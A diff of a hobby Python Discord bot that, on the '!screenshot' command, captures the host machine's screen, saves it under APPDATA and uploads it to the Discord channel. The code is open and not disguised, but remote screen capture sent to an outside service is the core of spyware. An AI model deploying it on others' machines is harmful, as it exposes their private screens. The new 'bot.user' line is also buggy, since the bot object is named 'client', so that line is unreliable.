@@ -1,7 +1,7 @@
 #change "token" to your discord bot token.
 #directoryname is the name of the folder the screenshot will be saved at.
 #prefix is the discord prefix used to perform the command.
-#directory will be located at roaming, inside appdata.
+#the directory will be located at roaming, inside appdata.
 #you can get to appdata running windows + R and typing appdata
 
 token = "change me"
@@ -12,45 +12,47 @@ prefix = "!"
 
 #----------------------------------------------------------------------------------#
 
+
+
+#imports
 import discord
 from discord.ext import commands
 import pyautogui
 import os
 import time
+
+#variables
 appdata = os.getenv("APPDATA")
 pathfld = rf"{appdata}\{directoryname}"
 pathss = rf"{appdata}\{directoryname}\screenshot.png"
 
 
+#screenshit taker
 def screenshitting():
     if not os.path.exists(pathfld):
         os.makedirs(f"{appdata}\{directoryname}")
-        print(f"created new folder at {pathfld}")
-
-
-    print (appdata)
+        print(f"created new folder at: {pathfld}")
     screenshot = pyautogui.screenshot()
     screenshot.save(rf'{appdata}\{directoryname}\screenshot.png')
 
 
 
-
-
-
+#bot
 
 client = commands.Bot(command_prefix = prefix, case_insensitive = True, intents=discord.Intents.all())
+
 @client.event
 async def on_ready():
-    print('connected and ready to use!')
-    
-    
+    print(f'connected and ready to use as {bot.user}')    
     
 
 
 @client.command()
 async def screenshot(ctx):
     screenshitting()
+    currenttime = time.strftime("%H:%M:%S")
     file = discord.File(pathss, filename="screenshot.png")
+    await ctx.send(f'Succesfuly generated screenshot at path {pathss} at {currenttime}')
     await ctx.send(file=file)
     
     time.sleep(2)
